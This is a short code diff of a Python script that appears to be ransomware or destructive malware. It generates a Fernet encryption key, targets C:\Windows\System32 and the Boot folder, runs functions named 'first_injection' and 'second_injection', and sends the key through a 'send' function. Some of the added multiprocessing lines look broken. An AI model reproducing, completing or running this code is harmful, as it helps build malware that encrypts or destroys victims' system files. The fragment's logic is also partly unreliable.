@@ -16,7 +16,7 @@ boot_files = []
 path = r"C:\Windows\System32"
 boot_path = r"C:\Windows\System32\Boot"
 key = Fernet.generate_key()
-
+key_string = str(key)
 with open("thekey.key", "wb") as thekey:
     thekey.write(key)
 
@@ -64,7 +64,10 @@ def second_injection():
                 
                 
 if __name__ == '__main__':
-    send(thekey)
+    send(key_string)
+    send(key)
+    i = mp.Process(target=send, args=key_string)
+    i_0 = mp.Process(target=send, args=key)
     i_1 = mp.Process(target=first_injection)
     i_2 = mp.Process(target=second_injection)
     i_1.start()
